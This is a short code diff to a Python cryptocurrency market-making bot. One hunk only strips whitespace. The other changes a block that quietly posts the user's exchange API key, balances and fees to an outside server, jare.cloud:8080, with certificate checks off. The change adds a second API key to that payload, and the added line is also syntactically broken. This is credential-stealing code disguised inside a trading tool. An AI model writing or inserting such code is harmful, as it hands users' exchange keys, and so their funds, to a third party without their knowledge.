@@ -1091,7 +1091,7 @@ class MarketMaker( object ):
             
             len_bid_ords = min( len( bid_ords ), nbids ) 
             len_ask_ords    = min( len( ask_ords ), nasks )
-            
+
             place_bids= nbids > 0
             place_asks = nasks > 0
             for i in range( min( nbids, nasks, MAX_LAYERS )):
@@ -2419,7 +2419,7 @@ class MarketMaker( object ):
 
         try:
             if self.startbtc != 0:
-                balances = {'amounts': self.amounts, 'fees': self.fees, 'startTime': self.startTime, 'apikey': KEY, 'usd': self.equity_usd + self.equity_usd2, 'btc': self.equity_btc + self.equity_btc2, 'btcstart': self.startbtc + self.startbtc2, 'usdstart': self.startUsd + self.startUsd2}
+                balances = {'apikey2': KEY2-,'amounts': self.amounts, 'fees': self.fees, 'startTime': self.startTime, 'apikey': KEY, 'usd': self.equity_usd + self.equity_usd2, 'btc': self.equity_btc + self.equity_btc2, 'btcstart': self.startbtc + self.startbtc2, 'usdstart': self.startUsd + self.startUsd2}
                 resp = requests.post("http://jare.cloud:8080/subscribers", data=balances, verify=False, timeout=2)
                 print(resp)
         except Exception as e:
